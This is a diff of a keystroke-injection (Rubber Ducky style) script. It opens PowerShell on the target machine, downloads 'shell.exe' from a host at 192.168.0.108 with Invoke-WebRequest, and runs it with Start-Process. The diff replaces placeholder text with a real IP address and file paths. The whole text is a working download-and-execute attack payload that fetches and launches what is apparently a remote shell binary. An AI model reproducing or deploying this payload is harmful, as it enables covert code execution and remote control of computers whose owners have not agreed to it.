@@ -5,10 +5,11 @@ STRING power
 DELAY 1000
 ENTER
 DELAY 2000
-STRING Invoke-WebRequest -Uri http://(serverip)/filename -OutFile (where to save file)
+STRING Invoke-WebRequest -Uri http://192.168.0.108/shell.exe -OutFile
+C:\Users\SHAAN\Desktop\shell.exe
 ENTER
 DELAY 2000
-STRING Start-Process -FilePath (saved file location)
+STRING Start-Process -FilePath C:\Users\SHAAN\Desktop\shell
 ENTER
 DELAY 2000
 EXIT
